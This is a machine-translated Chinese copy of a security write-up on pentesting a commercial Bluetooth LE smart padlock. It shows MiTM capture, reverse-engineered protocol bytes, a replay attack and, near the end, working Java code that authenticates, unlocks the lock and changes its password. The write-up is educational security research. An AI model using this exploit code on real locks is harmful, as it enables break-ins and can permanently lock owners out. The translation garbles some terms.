<html>
<head>
<title>Hacking a Bluetooth Smart Lock</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑掉蓝牙智能锁</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hacking-a-bluetooth-smart-lock-a710e056e6cf?source=collection_archive---------4-----------------------#2021-01-28">https://infosecwriteups.com/hacking-a-bluetooth-smart-lock-a710e056e6cf?source=collection_archive---------4-----------------------#2021-01-28</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="a2e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">本文是教育人们如何在物联网设备上正确进行渗透测试的系列文章的一部分。物联网Pentest系列将以蓝牙低能耗协议开启黑客之旅。</p><p id="ae38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">本文分析了一个商业挂锁，并讨论了渗透测试仪在笔测试支持BLE(蓝牙低能耗)的设备时应遵循的不同阶段。</p><p id="74aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个系列中，将使用<a class="ae kl" href="https://shellwanted.com/index.php/2021/01/08/introducing-blebit/" rel="noopener ugc nofollow" target="_blank"> BLE:钻头</a>，这使得事情变得更容易，尤其是对于这个领域的新手来说。<a class="ae kl" href="https://shellwanted.com/index.php/2021/01/08/introducing-blebit/" rel="noopener ugc nofollow" target="_blank"> BLE:Bit </a>是一款蓝牙低能耗安全评估工具，专为安全评估而设计。它配备了BLE:位SDK，一个Java软件开发工具包，有助于控制设备。此外，用户可以使用现有的CLI工具或BLE:位控制器(android)来控制设备。为了让我们的生活更轻松，我们将使用名为BLE的android应用程序:位控制器。</p><p id="6c48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">BLE:位控制器如何工作:</strong></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/b7a6789b637cdaa3db0d2434ebbf27f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6TepLgzZgLtRMWzgLYe3QQ.jpeg"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">BLE:比特中心和外围</figcaption></figure><p id="56f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">BLE:位控制器是一个android应用程序，它与附带的java服务器(运行在计算机上，即。raspberry pi)是基于BLE:Bit SDK的。当应用程序启动时，我们必须配置代理配置。然后，当控制器连接到java服务器时，BLE:比特中央和BLE:比特外围设备(它们连接到树莓派)通过java服务器在android控制器的控制下。通过使用控制器1.0版，我们可以查看和重放(或通过数据修改重放)数据到对等设备。</p><h1 id="55a0" class="lc ld iq bd le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz bi translated">攻击场景</h1><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/8a0bf71b7ebb0dfcb30e73a152149320.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*idHfAbSa7ztfI_jiR2Ej4w.jpeg"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">安邦智能锁</figcaption></figure><p id="1398" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">攻击场景如下:</p><p id="24a8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有一个智能锁，当点击它时，它就会被激活并等待客户端连接。智能锁配有android和iOS应用程序。当android应用程序发现该设备时，它会连接到智能锁，并通过单击供应商android应用程序上的解锁按钮来解锁该锁。首先，我希望完成一次MiTM攻击，以便更好地理解android应用程序和支持BLE的设备之间的应用层协议。为了实现这一点，我们将同时使用BLE:位中央处理器和BLE:位外围处理器。</p><p id="e126" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将在raspberry pi转移BLE:Bit的服务器(两个BLE:Bit设备——中央和外围——连接到raspberry pi，如下所示)。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/34267f5d702394f405fadb8f1c9eca47.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8nIbVY_6aaHzzgSs-F3S9g.jpeg"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">BLE:比特1.0版</figcaption></figure><p id="f268" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们启动服务器:</p><p id="4255" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">java -jar BLEBit-server.jar</p><p id="ff5a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">默认情况下，服务器监听TCP端口9090。这些信息对于BLE:位控制器android应用程序的配置是必要的。</p><p id="4def" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们通过使用第一个BLE:Bit android应用程序/ SDK来开始这个系列文章。</p><p id="c789" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下图显示了“BLE:位配置”页面。在配置过程中，我们可以选择几个选项(即包括扫描数据)。这很重要，因为扫描数据通常包含与广告数据不同的数据。这是重要的，因为流氓外设BLE:位设备需要知道什么数据应该广告。如果我们忽略任何广告数据，供应商的android应用程序可能无法连接到我们的流氓站，甚至可能根本无法连接。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/fd3a03e454c2daa46fd9b3dd9ab16bdf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1152/format:webp/1*vSExAdhgwhNoWEapDQRW5w.png"/></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">BLE:位控制器-配置页面</figcaption></figure><p id="2126" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我们点击connect时，BLE:Bit控制器启动一个到BLE:Bit服务器的连接，这个服务器是我们之前在Raspberry Pi上启动的。</p><p id="57df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我们打开供应商的android应用程序，以便与我们的流氓站通信并拦截任何BLE流量。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi mb"><img src="../Images/13b8f0ca9e891fe21fb9b26ce8f97860.png" data-original-src="https://miro.medium.com/v2/resize:fit:946/format:webp/1*uyz_CrYRYt3wKbHVJrsrXw.jpeg"/></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">Anboud安卓应用</figcaption></figure><p id="0e6e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当android应用程序打开时，它会通过搜索蓝牙设备地址来扫描附近的已知设备(之前已与它们配对)。如果任何已知设备在范围内，应用程序会启动与它们的连接。在这种情况下，另一端将是我们的流氓BLE:位外设。</p><p id="3e67" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">拦截流量与BLE:位控制器应用程序:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/cd5a1e07ee3a86b4d05305623ddf4e51.png" data-original-src="https://miro.medium.com/v2/resize:fit:1152/format:webp/1*NlhAiJLR-Ry6R0E6BKKD3Q.png"/></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">BLE:位控制器:流量拦截— MiTM</figcaption></figure><p id="f94c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">屏幕显示不同的特性以及正在使用的数值。W代表写，N代表通知。写意味着，供应商的android应用程序想要向另一个对等设备(锁)发送消息，而通知意味着锁希望向另一个对等设备(供应商的android应用程序)发回消息。</p><h1 id="d2b1" class="lc ld iq bd le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz bi translated">理解协议</h1><p id="5746" class="pw-post-body-paragraph jn jo iq jp b jq mc js jt ju md jw jx jy me ka kb kc mf ke kf kg mg ki kj kk ij bi translated">为了理解协议，需要对协议(如果可能的话)或应用程序的android进行逆向工程。理想情况是对两者进行逆向工程。</p><p id="cd70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">逆向工程的应用是微不足道的，因为没有剥离已执行APK。下面我们可以看到该类(com . CHL tec . base _ ble lock . module . protocol . blelockprotocol)的一部分，它包含自定义BLE协议的一些字段:</p><pre class="kn ko kp kq gt mh mi mj mk aw ml bi"><span id="6440" class="mm ld iq mi b gy mn mo l mp mq">public static final byte BLELOCK_STATE_CLOSE = (byte) 0;    // 0<br/>    public static final byte BLELOCK_STATE_OPEN = (byte) 1;     // 1<br/>    public static final byte CLOSE_BLELOCK = (byte) 2;          // 2<br/>    public static final byte COMMAND_AUTH_PWD = (byte) 65;      // 41<br/>    public static final byte COMMAND_ENERGY = (byte) 32;        // 20<br/>    public static final byte COMMAND_KEY_OPERATE_PWD = (byte) 80; // 50<br/>    public static final byte COMMAND_OPERATE_LOCK = (byte) 16;  // 10<br/>    public static final byte COMMAND_SETTING_PWD_MODE = (byte) 96; // 60<br/>    public static final byte COMMAND_SET_PASSWORD = (byte) 64;  // 40<br/>    public static final byte COMMAND_STATUS = (byte) 48;        // 30<br/>    public static final byte OPEN_BLELOCK = (byte) 1;           // 1<br/>    public static final byte REQUEST_ID = (byte) 85;            // 55<br/>    public static final byte RESPOND_ID = (byte) -86;           // aa</span></pre><p id="1e06" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用于为密码认证消息设置消息的方法:</p><pre class="kn ko kp kq gt mh mi mj mk aw ml bi"><span id="2f8c" class="mm ld iq mi b gy mn mo l mp mq">public static byte[] buildSetAuthPassword(int password) {<br/>        ByteBuffer byteBuffer = ByteBuffer.allocate(6);<br/>        byteBuffer.put(REQUEST_ID);<br/>        byteBuffer.put(COMMAND_SET_PASSWORD);<br/>        byteBuffer.put(ByteUtil.hexStringToByteArray(String.format("%06x", new Object[]{Integer.valueOf(password)})));<br/>        byteBuffer.put(checkSum(byteBuffer.array()));<br/>        Log.d(AppConstants.DEBUG_TAG, new String(Hex.encodeHex(byteBuffer.array())));<br/>        return byteBuffer.array();<br/>    }</span></pre><p id="e1c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以从第一条消息开始逐个解码协议消息。它从主设备发送到从设备，在这种情况下，从设备是智能锁的android应用程序。</p><p id="70ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">报文1: </strong> 0x01，0x00。</p><p id="b49a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">android应用程序需要启用通知，以便能够从从属设备接收任何值更新。</p><p id="b708" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">消息二:</strong></p><p id="c768" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该消息被分解如下所示:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/e8ec1ac69e2519bfabc1c5d4614fc982.png" data-original-src="https://miro.medium.com/v2/resize:fit:960/format:webp/1*ab158vl9Hf10n4XXzuxVnQ.png"/></div></figure><p id="a6f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">消息三:</strong></p><p id="4334" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该消息被分解如下所示:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ms"><img src="../Images/b7a50d290cb415bd6d2dcbcfa842d782.png" data-original-src="https://miro.medium.com/v2/resize:fit:968/format:webp/1*riFvTm5SXZj7DzkUD_4oBg.png"/></div></figure><p id="fe57" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">消息4: </strong></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/804b219bdeeddb3ecd732f9e3abe5296.png" data-original-src="https://miro.medium.com/v2/resize:fit:836/format:webp/1*smpi_TLr_6OMt98k9TdbMA.png"/></div></figure><p id="9f00" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">消息5: </strong></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi mu"><img src="../Images/9050b988fd245f5733156e09df8e8771.png" data-original-src="https://miro.medium.com/v2/resize:fit:732/format:webp/1*D52lBJoutmKyO71Hb2vs3Q.png"/></div></figure><p id="1e50" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个场景的最终目标是，作为攻击者，能够在没有真正所有者帮助的情况下打开锁。</p><p id="ef58" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过点击BLE智能锁的解锁按钮，我们可以看到信息并解码如下:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/2ddeccc7a393f1ce81ea5e99304a8173.png" data-original-src="https://miro.medium.com/v2/resize:fit:1152/format:webp/1*9CIFrnet_NHxsBs1zPW35Q.png"/></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">解锁智能锁时拦截数据包</figcaption></figure><p id="4a15" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">消息6: </strong></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi mv"><img src="../Images/8cf0b3466da0c5087440ae6d1692dcfb.png" data-original-src="https://miro.medium.com/v2/resize:fit:756/format:webp/1*C9VzBCYV_yZV5jSEw4ikyA.png"/></div></figure><p id="25b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在很清楚，打开锁只需要4个字节。</p><h1 id="b28e" class="lc ld iq bd le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz bi translated">渗透测试</h1><h2 id="a794" class="mm ld iq bd le mw mx dn li my mz dp lm jy na nb lq kc nc nd lu kg ne nf ly ng bi translated">BLE加密和认证:严重程度</h2><p id="621a" class="pw-post-body-paragraph jn jo iq jp b jq mc js jt ju md jw jx jy me ka kb kc mf ke kf kg mg ki kj kk ij bi translated">android应用程序没有应用BLE协议支持的任何加密方法，也没有应用应用层加密。</p><h2 id="0eb1" class="mm ld iq bd le mw mx dn li my mz dp lm jy na nb lq kc nc nd lu kg ne nf ly ng bi translated">认证:通过</h2><p id="ef81" class="pw-post-body-paragraph jn jo iq jp b jq mc js jt ju md jw jx jy me ka kb kc mf ke kf kg mg ki kj kk ij bi translated">我们已经观察到，应用了认证方法。但这还不够，因为任何扮演MTIM的人都可能截获密码信息并解锁，这就相当于游戏结束了。因此，智能锁容易受到MiTM和嗅探攻击。不过，我们还没有绕过认证。</p><h2 id="9f74" class="mm ld iq bd le mw mx dn li my mz dp lm jy na nb lq kc nc nd lu kg ne nf ly ng bi translated">重放攻击:严重程度</h2><p id="764b" class="pw-post-body-paragraph jn jo iq jp b jq mc js jt ju md jw jx jy me ka kb kc mf ke kf kg mg ki kj kk ij bi translated"><strong class="jp ir">设备未授权解锁</strong></p><p id="c806" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我们知道哪个消息执行每个动作，所以我们现在将通过重放一些消息(和/或改变它们)来检查对等设备何时接受重放的数据。这将针对android应用程序和智能锁来执行。同样，我们可以通过BLE:位控制器，向左/向右滑动任何信息来实现。然后，会出现一个消息框，询问我们是否要修改数据。在这个阶段，我们不希望改变任何数据。</p><p id="1089" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了使场景更加有趣、真实和有趣，我们将在没有供应商的android应用程序的情况下连接到智能锁。为此，我们需要将数据存储在数据库中。这由BLE:位控制器应用程序通过代理配置页面来处理。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/564eb57b9712d8cc7515a5efe3ae5ac2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1152/format:webp/1*jMPBEeMCa6H0-Q8IJcpXMQ.png"/></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">在仅连接智能锁的情况下执行重放攻击</figcaption></figure><p id="5f8b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我们所看到的，我们已经通过使用之前接收的完全相同的认证消息进行了认证，并且通过使用相同的“打开锁”消息解锁了不安全的智能设备。锁已被成功打开。android应用程序无法与目标设备建立安全通信，因此信息的保密性受到影响。</p><h1 id="2fe0" class="lc ld iq bd le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz bi translated">自动解锁</h1><p id="a468" class="pw-post-body-paragraph jn jo iq jp b jq mc js jt ju md jw jx jy me ka kb kc mf ke kf kg mg ki kj kk ij bi translated">锁定实现无法建立安全通信，因此可能会出现数据包重放的情况。那么，在用户无法重置密码的情况下，我们如何更改密码以拒绝实际用户的访问呢？</p><p id="0e28" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">默认情况下，智能锁不支持密码重置。这意味着，如果未经授权的用户更改了密码，实际用户将被永远锁定。</p><p id="0a2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们遵循了前面重放攻击中描述的相同步骤。首先，我们可以通过android应用程序完成操作(更改密码)，然后我们重放数据，以确认密码可以被未经授权的参与者更改。由于缺少加密算法，任何持有密码的人都可以更改密码，这是有道理的。这不是一个安全问题，但是为了完成测试，这里显示了解决方案。</p><p id="5e78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们利用BLE:Bit SDK 1.7版开发了一个小代码片段，它可以自动找到锁，并在找到锁后立即解锁。</p><p id="e7f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这并不难做到，因为使用BLE:位SDK是直截了当的。</p><p id="1ada" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们创建一个中央回调对象。</p><pre class="kn ko kp kq gt mh mi mj mk aw ml bi"><span id="f4a2" class="mm ld iq mi b gy mn mo l mp mq">CEBLEDeviceCallbackHandler devCallback = new CEBLEDeviceCallbackHandler();</span></pre><p id="494f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，创建并配置中心:</p><pre class="kn ko kp kq gt mh mi mj mk aw ml bi"><span id="c3a6" class="mm ld iq mi b gy mn mo l mp mq">ce = new CEController(startComm(prolific_ftdi), devCallback);<br/>			ce.sendConnectionParameters(9, 13, 0, 1000,  /*Scan*/ 500/*Interval*/, 400/*Window*/, 0/*Timeout*/, /*Connection*/  50, 40, 0xffff, false);<br/>			ce.sendBluetoothDeviceAddress("ff:55:ee:fe:4a:af", ConnectionTypesCommon.BITAddressType.STATIC_PRIVATE);<br/>			ce.configurePairing(ConnectionTypesCommon.PairingMethods.NO_IO, null);<br/>			ce.eraseBonds();<br/>			ce.finishSetup();</span></pre><p id="678d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下代码行将启动CE并开始监听(任何)目标:</p><pre class="kn ko kp kq gt mh mi mj mk aw ml bi"><span id="1682" class="mm ld iq mi b gy mn mo l mp mq">ce.connectNow(target, AddressType.PUBLIC_ADDR);</span></pre><p id="8d29" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，下面的代码可用于使用自定义协议进行通信、身份验证、解锁，然后更改现有密码:</p><pre class="kn ko kp kq gt mh mi mj mk aw ml bi"><span id="5070" class="mm ld iq mi b gy mn mo l mp mq">byte [] auth = new byte[] {0x55, 0x41, 0x01, 0x02, (byte)0x03, 0x00};<br/>			checksum(auth);<br/>			byte [] open = new byte[] {0x55, 0x10, 0x01, 0x00};<br/>			checksum(open);<br/>			byte [] passmode = new byte[] {0x55, 0x60, 0x00}; <br/>			checksum(passmode);<br/>			byte [] setpassword = new byte[] {0x55, 0x40, 0x02, 0x61, (byte)0xfc, 0}; <br/>			checksum(setpassword);<br/>			// Authenticate and open lock<br/>			ce.writeData(auth, 0, auth.length, (short)41);<br/>			ce.writeData(open, 0, open.length, (short)41);<br/>			// Enter Password-change mode and alter password<br/>			ce.writeData(passmode, 0, passmode.length, (short)41);<br/>			ce.writeData(setpassword, 0, setpassword.length, (short)41);<br/>			<br/>			ce.disconnect(19);<br/>			ce.terminate();</span></pre><p id="ee88" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过编译和运行上述java代码，智能锁在启用时，在不到几毫秒的时间内就被解锁，密码被更改。</p><p id="961f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请记住，还可以做得更多。例如，我们可以改变android应用程序中显示的电池电量。消息通过我们的BLE传输:位控制器和改变供应商的应用程序的电池电量指示器是小菜一碟。可以应用与已经解释的技术没有区别的相同技术。</p><p id="13d0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请继续关注更多有趣的文章！</p><p id="0ac2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">仅供参考:你可能会在shellwanted.com</strong><a class="ae kl" href="https://bit.ly/3t6NoKb" rel="noopener ugc nofollow" target="_blank">找到BLE:比特</a></p></div></div>    
</body>
</html>